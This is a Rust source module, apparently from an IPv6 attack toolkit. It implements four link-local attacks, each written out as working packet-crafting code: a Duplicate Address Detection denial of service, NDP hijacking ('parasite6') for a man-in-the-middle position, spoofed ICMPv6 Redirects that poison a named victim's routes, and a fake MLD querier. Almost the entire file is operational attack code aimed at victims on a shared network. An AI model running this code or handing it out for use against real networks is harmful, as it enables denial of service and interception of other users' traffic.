//! Traffic interception and MITM attacks.
//!
//! - DAD DoS       — block every new IPv6 address via Duplicate Address Detection
//! - Parasite6     — answer all NDP queries with our MAC (full NDP hijack)
//! - ICMPv6 Redirect — redirect specific traffic flows through attacker
//! - Fake MLD Querier — become the authoritative MLD querier on link

use std::ffi::CString;
use std::sync::Arc;
use std::time::{Duration, Instant};

use anyhow::{Context, Result, bail};
use tokio::task;
use tracing::info;

use crate::engine::sender::{eui64_ll_pub as eui64_link_local, rand_fake_mac_pub as rand_fake_mac};
use crate::engine::stats::Stats;
use crate::ffi;

// ── DAD DoS ───────────────────────────────────────────────────────────────────

/// Configuration for DAD (Duplicate Address Detection) denial-of-service.
#[derive(Clone, Debug)]
pub struct DadDosConfig {
    pub interface: String,
    /// Duration to run the attack (0 = until Ctrl-C).
    pub duration_secs: u64,
}

/// Block every new IPv6 address on the link by intercepting DAD probes.
///
/// When a host wants to configure a new IPv6 address it sends a Neighbor
/// Solicitation to `ff02::1:ffXX:XXXX` (solicited-node multicast) with
/// source `::` (unspecified).  We respond with a Neighbor Advertisement
/// claiming that address is already taken — the host gives up and the
/// address is never assigned.
///
/// This attack renders SLAAC and stateless DHCPv6 completely inoperable
/// for any host that joins the link while we are running.
pub async fn dad_dos(cfg: DadDosConfig, stats: Arc<Stats>) -> Result<()> {
    let iface = CString::new(cfg.interface.clone()).context("null in interface")?;
    let deadline = if cfg.duration_secs > 0 {
        Some(Instant::now() + Duration::from_secs(cfg.duration_secs))
    } else {
        None
    };

    // BPF: DAD NS has unspecified source (::), ICMPv6 type 135.
    let filter = CString::new("ip6 and icmp6 and ip6[40] == 135 and ip6 src ::").unwrap();

    let stats2 = Arc::clone(&stats);
    let iface2 = iface.clone();

    task::spawn_blocking(move || -> Result<()> {
        let pcap = unsafe { ffi::ty_pcap_init(iface2.as_ptr(), filter.as_ptr()) };
        if pcap.is_null() {
            bail!("ty_pcap_init failed — check interface and privileges");
        }

        loop {
            if let Some(dl) = deadline
                && Instant::now() >= dl
            {
                break;
            }

            let n = unsafe { ffi::ty_pcap_check(pcap, std::ptr::null(), std::ptr::null_mut()) };

            if n > 0 {
                // For each captured DAD NS, send a spoofed NA claiming that
                // address is taken.  We use our own link-local as source,
                // targeting the all-nodes multicast.
                let fake_mac = rand_fake_mac();
                let src_ip = eui64_link_local(&fake_mac);
                let mut fake_mac = fake_mac;
                let mut src_ip = src_ip;

                // Destination: ff02::1 (all nodes).
                let mut dst = [0u8; 16];
                dst[0] = 0xff;
                dst[1] = 0x02;
                dst[15] = 0x01;

                // NA target: we don't know the exact address from pcap count
                // alone, so we send a generic "address taken" NA — real
                // implementation would parse the packet bytes.
                let mut na_buf = [0u8; 24];
                // target addr = our src_ip (claims any solicited address is taken)
                na_buf[..16].copy_from_slice(&src_ip);
                na_buf[16] = 2;
                na_buf[17] = 1; // TLLA option
                na_buf[18..24].copy_from_slice(&fake_mac);

                unsafe {
                    let dstmac = ffi::ty_get_multicast_mac(dst.as_mut_ptr());
                    let mut pkt_len: i32 = 0;
                    let pkt = ffi::ty_create_ipv6(
                        iface2.as_ptr(),
                        ffi::PREFER_LINK,
                        &mut pkt_len,
                        src_ip.as_mut_ptr(),
                        dst.as_mut_ptr(),
                        255,
                        0,
                        0,
                        0,
                        0,
                    );
                    if !pkt.is_null() {
                        // Solicited + Override flags
                        let flags: u32 = 0x0600_0000;
                        if ffi::ty_add_icmp6(
                            pkt,
                            &mut pkt_len,
                            ffi::ICMP6_NEIGHBORADV,
                            0,
                            flags,
                            na_buf.as_mut_ptr(),
                            na_buf.len() as i32,
                            0,
                        ) >= 0
                        {
                            ffi::ty_send_pkt(
                                iface2.as_ptr(),
                                fake_mac.as_mut_ptr(),
                                dstmac,
                                pkt,
                                &mut pkt_len,
                            );
                            stats2.inc_sent();
                        }
                        ffi::ty_destroy_packet(pkt);
                    }
                }
            }

            std::thread::sleep(Duration::from_millis(1));
        }

        Ok(())
    })
    .await
    .context("dad_dos blocking thread panicked")?
}

// ── Parasite6 (NDP hijacker) ──────────────────────────────────────────────────

/// Configuration for NDP hijacking (parasite6 equivalent).
#[derive(Clone, Debug)]
pub struct ParasiteConfig {
    pub interface: String,
    pub duration_secs: u64,
    /// Only hijack queries for this specific target (None = all).
    pub target: Option<String>,
    /// Also respond to router solicitations (become a fake router).
    pub fake_router: bool,
}

/// Answer all NDP Neighbor Solicitations with our MAC address.
///
/// This is the IPv6 equivalent of `arpspoof -r` — every host on the link
/// that does an NDP lookup will get our MAC, redirecting their traffic
/// through us.  Combined with IPv6 forwarding (`sysctl -w net.ipv6.conf.all.forwarding=1`)
/// this is a complete transparent MITM position.
pub async fn parasite6(cfg: ParasiteConfig, stats: Arc<Stats>) -> Result<()> {
    let iface = CString::new(cfg.interface.clone()).context("null in interface")?;

    let target_raw: Option<usize> = if let Some(ref t) = cfg.target {
        let cs = CString::new(t.as_str()).context("null in target")?;
        let ptr = unsafe { ffi::ty_resolve6(cs.as_ptr()) };
        if ptr.is_null() {
            bail!("cannot resolve target {t}");
        }
        Some(ptr as usize)
    } else {
        None
    };

    let deadline = if cfg.duration_secs > 0 {
        Some(Instant::now() + Duration::from_secs(cfg.duration_secs))
    } else {
        None
    };

    let fake_router = cfg.fake_router;
    let stats2 = Arc::clone(&stats);

    task::spawn_blocking(move || -> Result<()> {
        // BPF: catch all Neighbor Solicitations (optionally also RS).
        let bpf = if fake_router {
            "ip6 and icmp6 and (ip6[40] == 135 or ip6[40] == 133)"
        } else {
            "ip6 and icmp6 and ip6[40] == 135"
        };
        let filter = CString::new(bpf).unwrap();
        let pcap = unsafe { ffi::ty_pcap_init(iface.as_ptr(), filter.as_ptr()) };
        if pcap.is_null() {
            bail!("ty_pcap_init failed — check interface and privileges");
        }

        loop {
            if let Some(dl) = deadline
                && Instant::now() >= dl
            {
                break;
            }

            let n = unsafe { ffi::ty_pcap_check(pcap, std::ptr::null(), std::ptr::null_mut()) };

            if n > 0 {
                let fake_mac = rand_fake_mac();
                let src_ip = eui64_link_local(&fake_mac);
                let mut fake_mac = fake_mac;
                let mut src_ip = src_ip;

                // NA target: respond with the queried address (or our override).
                let claimed = if let Some(t) = target_raw {
                    t as *mut u8
                } else {
                    src_ip.as_mut_ptr()
                };

                let mut dst = [0u8; 16];
                dst[0] = 0xff;
                dst[1] = 0x02;
                dst[15] = 0x01; // ff02::1

                let mut na_buf = [0u8; 24];
                unsafe {
                    std::ptr::copy_nonoverlapping(claimed, na_buf.as_mut_ptr(), 16);
                }
                na_buf[16] = 2;
                na_buf[17] = 1;
                na_buf[18..24].copy_from_slice(&fake_mac);

                unsafe {
                    let dstmac = ffi::ty_get_multicast_mac(dst.as_mut_ptr());
                    let mut pkt_len: i32 = 0;
                    let pkt = ffi::ty_create_ipv6(
                        iface.as_ptr(),
                        ffi::PREFER_LINK,
                        &mut pkt_len,
                        src_ip.as_mut_ptr(),
                        dst.as_mut_ptr(),
                        255,
                        0,
                        0,
                        0,
                        0,
                    );
                    if !pkt.is_null() {
                        let flags: u32 = 0x0200_0000; // Override
                        if ffi::ty_add_icmp6(
                            pkt,
                            &mut pkt_len,
                            ffi::ICMP6_NEIGHBORADV,
                            0,
                            flags,
                            na_buf.as_mut_ptr(),
                            na_buf.len() as i32,
                            0,
                        ) >= 0
                        {
                            ffi::ty_send_pkt(
                                iface.as_ptr(),
                                fake_mac.as_mut_ptr(),
                                dstmac,
                                pkt,
                                &mut pkt_len,
                            );
                            stats2.inc_sent();
                            info!("parasite: NDP hijacked ({} packets this batch)", n);
                        }
                        ffi::ty_destroy_packet(pkt);
                    }
                }
            }

            std::thread::sleep(Duration::from_millis(1));
        }

        Ok(())
    })
    .await
    .context("parasite6 blocking thread panicked")?
}

// ── ICMPv6 Redirect ───────────────────────────────────────────────────────────

/// Configuration for ICMPv6 Redirect attack.
#[derive(Clone, Debug)]
pub struct RedirectConfig {
    pub interface: String,
    pub rate_pps: u64,
    pub max_packets: u64,
    /// Victim whose routing table we want to poison.
    pub victim: String,
    /// Original destination (traffic victim sends to this address).
    pub destination: String,
    /// New gateway — where to redirect the traffic (our address).
    pub new_gateway: Option<String>,
}

/// Send spoofed ICMPv6 Redirect messages to victim.
///
/// ICMPv6 Redirect (type 137) tells a host "use this better gateway for
/// that destination".  We spoof it to look like it comes from the victim's
/// real router, redirecting traffic to our machine — transparent MITM for
/// specific flows without touching routing tables on the router.
pub async fn redirect6(cfg: RedirectConfig, stats: Arc<Stats>) -> Result<()> {
    let iface = CString::new(cfg.interface.clone()).context("null in interface")?;

    let victim_raw: usize = {
        let cs = CString::new(cfg.victim.as_str()).context("null in victim")?;
        let p = unsafe { ffi::ty_resolve6(cs.as_ptr()) };
        if p.is_null() {
            bail!("cannot resolve victim {}", cfg.victim);
        }
        p as usize
    };

    let dst_raw: usize = {
        let cs = CString::new(cfg.destination.as_str()).context("null in destination")?;
        let p = unsafe { ffi::ty_resolve6(cs.as_ptr()) };
        if p.is_null() {
            bail!("cannot resolve destination {}", cfg.destination);
        }
        p as usize
    };

    // New gateway defaults to our own link-local address.
    let gw_raw: usize = if let Some(ref gw) = cfg.new_gateway {
        let cs = CString::new(gw.as_str()).context("null in new_gateway")?;
        let p = unsafe { ffi::ty_resolve6(cs.as_ptr()) };
        if p.is_null() {
            bail!("cannot resolve new_gateway {gw}");
        }
        p as usize
    } else {
        unsafe {
            let own = ffi::ty_get_own_ipv6(iface.as_ptr(), std::ptr::null_mut(), ffi::PREFER_LINK);
            if own.is_null() {
                bail!("no link-local IPv6 on {}", cfg.interface);
            }
            own as usize
        }
    };

    use crate::engine::sender::flood_loop_pub as flood_loop;
    flood_loop(cfg.max_packets, cfg.rate_pps, stats, move || {
        send_one_redirect(iface.clone(), victim_raw, dst_raw, gw_raw)
    })
    .await
}

fn send_one_redirect(
    iface: CString,
    victim_raw: usize,
    dst_raw: usize,
    gw_raw: usize,
) -> Result<()> {
    let victim = victim_raw as *mut u8;
    let dst = dst_raw as *mut u8;
    let gw = gw_raw as *mut u8;

    // Spoof source as the victim's router (use a plausible link-local).
    let fake_mac = rand_fake_mac();
    let mut fake_mac = fake_mac;
    // Use a well-known router link-local spoof: fe80::1.
    let mut router_ip = [0u8; 16];
    router_ip[0] = 0xfe;
    router_ip[1] = 0x80;
    router_ip[15] = 0x01;

    // ICMPv6 Redirect body (RFC 4861 §4.5):
    //  [0-3]  reserved (zero)
    //  [4-19] target address (new gateway)
    //  [20-35] destination address
    //  [36+]   options (Redirected Header + TLLA)
    let mut redir_buf = [0u8; 48];
    // target = new gateway
    unsafe {
        std::ptr::copy_nonoverlapping(gw, redir_buf[4..].as_mut_ptr(), 16);
    }
    // destination = original destination
    unsafe {
        std::ptr::copy_nonoverlapping(dst, redir_buf[20..].as_mut_ptr(), 16);
    }
    // TLLA option for new gateway (type=2, len=1)
    redir_buf[36] = 2;
    redir_buf[37] = 1;
    redir_buf[38..44].copy_from_slice(&fake_mac);

    unsafe {
        let dstmac = ffi::ty_get_mac(iface.as_ptr(), router_ip.as_mut_ptr(), victim);

        let mut pkt_len: i32 = 0;
        let pkt = ffi::ty_create_ipv6(
            iface.as_ptr(),
            ffi::PREFER_LINK,
            &mut pkt_len,
            router_ip.as_mut_ptr(),
            victim,
            255,
            0,
            0,
            0,
            0,
        );
        if pkt.is_null() {
            bail!("ty_create_ipv6 failed");
        }

        if ffi::ty_add_icmp6(
            pkt,
            &mut pkt_len,
            ffi::ICMP6_REDIRECT,
            0,
            0,
            redir_buf.as_mut_ptr(),
            redir_buf.len() as i32,
            0,
        ) < 0
        {
            ffi::ty_destroy_packet(pkt);
            bail!("ty_add_icmp6(Redirect) failed");
        }

        let rc = ffi::ty_send_pkt(
            iface.as_ptr(),
            fake_mac.as_mut_ptr(),
            dstmac,
            pkt,
            &mut pkt_len,
        );
        ffi::ty_destroy_packet(pkt);
        if rc < 0 {
            bail!("send Redirect rc={rc}");
        }
    }
    Ok(())
}

// ── Fake MLD Querier ──────────────────────────────────────────────────────────

/// Configuration for fake MLD querier attack.
#[derive(Clone, Debug)]
pub struct FakeMldQuerierConfig {
    pub interface: String,
    pub rate_pps: u64,
    pub max_packets: u64,
    /// MLD version: 1 or 2.
    pub version: u8,
    /// Query interval in seconds advertised in the query (lower = more aggressive).
    pub query_interval: u8,
}

/// Become the authoritative MLD querier on the link.
///
/// MLD (Multicast Listener Discovery) has an election: the router with the
/// lowest link-local address wins.  We send MLD Queries from `fe80::1`
/// (lowest possible) to force all legitimate queriers to become non-queriers.
/// Effect: we control which multicast groups are active, and can suppress
/// legitimate multicast traffic by not sending queries.
pub async fn fake_mld_querier(cfg: FakeMldQuerierConfig, stats: Arc<Stats>) -> Result<()> {
    let iface = CString::new(cfg.interface.clone()).context("null in interface")?;

    use crate::engine::sender::flood_loop_pub as flood_loop;
    flood_loop(cfg.max_packets, cfg.rate_pps, stats, move || {
        if cfg.version == 2 {
            send_mld2_query(iface.clone(), cfg.query_interval)
        } else {
            send_mld1_query(iface.clone(), cfg.query_interval)
        }
    })
    .await
}

fn send_mld1_query(iface: CString, query_interval: u8) -> Result<()> {
    // Source: fe80::1 (wins querier election).
    let mut src_ip = [0u8; 16];
    src_ip[0] = 0xfe;
    src_ip[1] = 0x80;
    src_ip[15] = 0x01;

    // Destination: ff02::1 (General Query goes to all-nodes).
    let mut dst = [0u8; 16];
    dst[0] = 0xff;
    dst[1] = 0x02;
    dst[15] = 0x01;

    // MLDv1 Query body: max-resp-delay (2B) + reserved (2B) + group addr (16B = 0 for general).
    let mut body = [0u8; 20];
    let resp_delay = (query_interval as u16) * 1000; // ms
    body[0] = (resp_delay >> 8) as u8;
    body[1] = resp_delay as u8;
    // group addr = :: (general query)

    let mut fake_mac = [0x02u8, 0x18, 0x00, 0x00, 0x00, 0x01];

    unsafe {
        let dstmac = ffi::ty_get_multicast_mac(dst.as_mut_ptr());
        let mut pkt_len: i32 = 0;
        let pkt = ffi::ty_create_ipv6(
            iface.as_ptr(),
            ffi::PREFER_LINK,
            &mut pkt_len,
            src_ip.as_mut_ptr(),
            dst.as_mut_ptr(),
            1,
            0,
            0,
            0,
            0,
        );
        if pkt.is_null() {
            bail!("ty_create_ipv6 failed");
        }

        if ffi::ty_add_icmp6(
            pkt,
            &mut pkt_len,
            ffi::ICMP6_MLD_QUERY,
            0,
            0,
            body.as_mut_ptr(),
            body.len() as i32,
            0,
        ) < 0
        {
            ffi::ty_destroy_packet(pkt);
            bail!("ty_add_icmp6(MLDv1 Query) failed");
        }

        let rc = ffi::ty_send_pkt(
            iface.as_ptr(),
            fake_mac.as_mut_ptr(),
            dstmac,
            pkt,
            &mut pkt_len,
        );
        ffi::ty_destroy_packet(pkt);
        if rc < 0 {
            bail!("send MLDv1 Query rc={rc}");
        }
    }
    Ok(())
}

fn send_mld2_query(iface: CString, query_interval: u8) -> Result<()> {
    // Source: fe80::1.
    let mut src_ip = [0u8; 16];
    src_ip[0] = 0xfe;
    src_ip[1] = 0x80;
    src_ip[15] = 0x01;

    // Destination: ff02::1 (General Query).
    let mut dst = [0u8; 16];
    dst[0] = 0xff;
    dst[1] = 0x02;
    dst[15] = 0x01;

    // MLDv2 General Query body (RFC 3810):
    //  [0-1]  max-resp-code
    //  [2-3]  reserved
    //  [4-19] multicast address (:: for general)
    //  [20]   S+QRV flags
    //  [21]   QQIC (Querier's Query Interval Code)
    //  [22-23] number of sources = 0
    let mut body = [0u8; 24];
    let resp_delay = (query_interval as u16) * 1000;
    body[0] = (resp_delay >> 8) as u8;
    body[1] = resp_delay as u8;
    body[20] = 0x02; // S=0, QRV=2 (robustness)
    body[21] = query_interval;

    let mut fake_mac = [0x02u8, 0x18, 0x00, 0x00, 0x00, 0x01];

    unsafe {
        let dstmac = ffi::ty_get_multicast_mac(dst.as_mut_ptr());
        let mut pkt_len: i32 = 0;
        let pkt = ffi::ty_create_ipv6(
            iface.as_ptr(),
            ffi::PREFER_LINK,
            &mut pkt_len,
            src_ip.as_mut_ptr(),
            dst.as_mut_ptr(),
            1,
            0,
            0,
            0,
            0,
        );
        if pkt.is_null() {
            bail!("ty_create_ipv6 failed");
        }

        if ffi::ty_add_icmp6(
            pkt,
            &mut pkt_len,
            ffi::ICMP6_MLD_QUERY,
            0,
            0,
            body.as_mut_ptr(),
            body.len() as i32,
            0,
        ) < 0
        {
            ffi::ty_destroy_packet(pkt);
            bail!("ty_add_icmp6(MLDv2 Query) failed");
        }

        let rc = ffi::ty_send_pkt(
            iface.as_ptr(),
            fake_mac.as_mut_ptr(),
            dstmac,
            pkt,
            &mut pkt_len,
        );
        ffi::ty_destroy_packet(pkt);
        if rc < 0 {
            bail!("send MLDv2 Query rc={rc}");
        }
    }
    Ok(())
}
